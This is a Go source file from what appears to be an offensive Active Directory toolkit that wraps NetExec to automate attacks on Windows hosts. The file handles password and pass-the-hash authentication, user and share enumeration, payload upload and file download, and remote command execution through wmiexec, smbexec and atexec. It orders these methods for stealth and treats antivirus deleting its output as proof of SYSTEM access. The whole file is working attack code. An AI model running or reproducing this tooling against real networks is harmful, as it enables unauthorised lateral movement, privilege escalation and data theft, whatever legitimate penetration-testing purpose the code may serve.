package tools

import (
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

type nxcTool struct{}

var NetExec = nxcTool{}

func (nxcTool) Name() string { return "netexec" }
func (nxcTool) Available() bool {
	_, err := utils.FindTool("netexec")
	return err == nil
}

type NetExecTarget struct {
	Protocol string // smb, ldap, winrm, mssql
	Host     string
	Port     int
	Domain   string
	Username string
	Password string
	Hash     string
}

func (n nxcTool) Run(ctx context.Context, target NetExecTarget, subcmd string, extraArgs []string) (utils.CmdResult, error) {
	args := []string{target.Protocol, target.Host}
	if target.Port > 0 {
		args = append(args, fmt.Sprintf("--port=%d", target.Port))
	}
	if target.Domain != "" {
		args = append(args, "-d", target.Domain)
	}
	if target.Username != "" {
		args = append(args, "-u", target.Username)
	}
	if target.Password != "" {
		args = append(args, "-p", target.Password)
	}
	if target.Hash != "" {
		args = append(args, "-H", target.Hash)
	}
	if subcmd != "" {
		args = append(args, subcmd)
	}
	args = append(args, extraArgs...)
	r := utils.RunCommandCtx(ctx, "netexec", args)
	if !r.Success {
		return r, fmt.Errorf("netexec failed: %s", r.Stderr)
	}
	return r, nil
}

func (n nxcTool) AuthTest(ctx context.Context, target NetExecTarget) bool {
	_, err := n.Run(ctx, target, "", nil)
	return err == nil
}

func (n nxcTool) EnumUsers(ctx context.Context, target string) ([]core.User, error) {
	r := utils.RunCommandCtx(ctx, "netexec", []string{"ldap", target, "--users"})
	if !r.Success {
		return nil, fmt.Errorf("netexec ldap enum failed: %s", r.Stderr)
	}
	var users []core.User
	for _, line := range strings.Split(r.Stdout, "\n") {
		if strings.Contains(line, "USER:") {
			parts := strings.Split(line, "USER:")
			if len(parts) > 1 {
				username := strings.TrimSpace(strings.Split(parts[1], " ")[0])
				if username != "" {
					users = append(users, core.User{Username: username, Source: "netexec"})
				}
			}
		}
	}
	return users, nil
}

func (n nxcTool) EnumShares(ctx context.Context, target NetExecTarget) ([]string, error) {
	r, err := n.Run(ctx, target, "--shares", nil)
	if err != nil {
		return nil, err
	}
	var shares []string
	for _, line := range strings.Split(r.Stdout, "\n") {
		if strings.Contains(line, "SHARE:") {
			parts := strings.Split(line, "SHARE:")
			if len(parts) > 1 {
				shares = append(shares, strings.TrimSpace(strings.Split(parts[1], " ")[0]))
			}
		}
	}
	return shares, nil
}

func (n nxcTool) PutFile(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (utils.CmdResult, error) {
	// filepath.Base is OS-aware (handles both / and \ on Windows operator boxes).
	base := filepath.Base(localPath)
	if base == "." || base == "/" || base == `\` {
		base = "payload.bin"
	}

	remotePath := strings.TrimPrefix(remoteDir, `C:\`)
	remotePath = strings.TrimPrefix(remotePath, `c:\`)
	remotePath = strings.TrimPrefix(remotePath, `C$\`)
	remotePath = strings.TrimLeft(remotePath, `/\`)

	// Only treat remoteDir as a directory when it has an explicit trailing
	// separator (\ or /). This check uses strings.HasSuffix to detect the
	// trailing separator, avoiding misclassification of extensionless executables.
	if strings.HasSuffix(remoteDir, `\`) || strings.HasSuffix(remoteDir, `/`) {
		if remotePath != "" {
			remotePath = strings.TrimRight(remotePath, `/\`) + `\` + base
		} else {
			remotePath = base
		}
	}

	fmt.Printf("[*] PutFile: %s → %s\n", localPath, remotePath)
	return n.Run(ctx, target, "--put-file", []string{localPath, remotePath})
}

func (n nxcTool) GetFile(ctx context.Context, target NetExecTarget, remotePath, localDir string) (utils.CmdResult, error) {
	return n.Run(ctx, target, "--get-file", []string{remotePath, localDir})
}

// ExecMethodOrder is the canonical failover sequence for remote command execution.
// wmiexec runs as the authenticated user; smbexec/atexec run as SYSTEM (service
// or task scheduler). Order chosen for stealth → reliability tradeoff.
var ExecMethodOrder = []string{"wmiexec", "smbexec", "atexec"}

// FailoverResult captures which exec-method actually returned output, useful for
// downstream parsing (e.g. SYSTEM-context detection) and evidence logging.
type FailoverResult struct {
	utils.CmdResult
	Method string
}

// RunFailover executes a shell command on the target trying each exec-method
// in order until one succeeds within the per-attempt timeout. Returns the first
// successful result, or the last attempted result if all failed.
//
// Use this for any remote command where the *output* matters. For fire-and-forget
// payloads, prefer Run with `start /B` directly so you don't pay the failover cost.
func (n nxcTool) RunFailover(ctx context.Context, target NetExecTarget, command string, perAttempt time.Duration) (FailoverResult, error) {
	if perAttempt <= 0 {
		perAttempt = 45 * time.Second
	}
	var last FailoverResult
	var lastErr error
	for _, method := range ExecMethodOrder {
		attemptCtx, cancel := context.WithTimeout(ctx, perAttempt)
		r, err := n.Run(attemptCtx, target, "--exec-method", []string{method, "-x", command})
		cancel()
		last = FailoverResult{CmdResult: r, Method: method}
		lastErr = err
		if err == nil && r.Success {
			return last, nil
		}
		// Don't keep retrying if the parent context was cancelled
		if ctx.Err() != nil {
			return last, ctx.Err()
		}
	}
	return last, lastErr
}

// RunSystemCheck attempts to obtain SYSTEM context on the target by running
// `whoami` through smbexec (service → SYSTEM) then atexec (schtask → SYSTEM).
// Returns (method, true) when SYSTEM is confirmed, ("", false) otherwise.
//
// Skips wmiexec because wmiexec runs as the authenticated user, never SYSTEM.
//
// Two success paths are accepted:
//  1. whoami output contains "nt authority\system" (output retrieved cleanly).
//  2. nxc reports "executed command via" + "could not retrieve output file"
//     (command ran as SYSTEM but Defender ate the output file). This is still
//     SYSTEM — smbexec/atexec always run as LocalSystem.
func (n nxcTool) RunSystemCheck(ctx context.Context, target NetExecTarget, perAttempt time.Duration) (string, utils.CmdResult, bool) {
	if perAttempt <= 0 {
		perAttempt = 45 * time.Second
	}
	for _, method := range []string{"smbexec", "atexec"} {
		attemptCtx, cancel := context.WithTimeout(ctx, perAttempt)
		r, err := n.Run(attemptCtx, target, "--exec-method", []string{method, "-x", "whoami"})
		cancel()
		if err != nil {
			if ctx.Err() != nil {
				return "", r, false
			}
			continue
		}
		out := strings.ToLower(r.Stdout + r.Stderr)
		if strings.Contains(out, "nt authority") && strings.Contains(out, "system") {
			return method, r, true
		}
		// AV eating the output file is still SYSTEM — the task/service ran.
		if strings.Contains(out, "executed command via") &&
			strings.Contains(out, "could not retrieve output file") {
			return method, r, true
		}
	}
	return "", utils.CmdResult{}, false
}
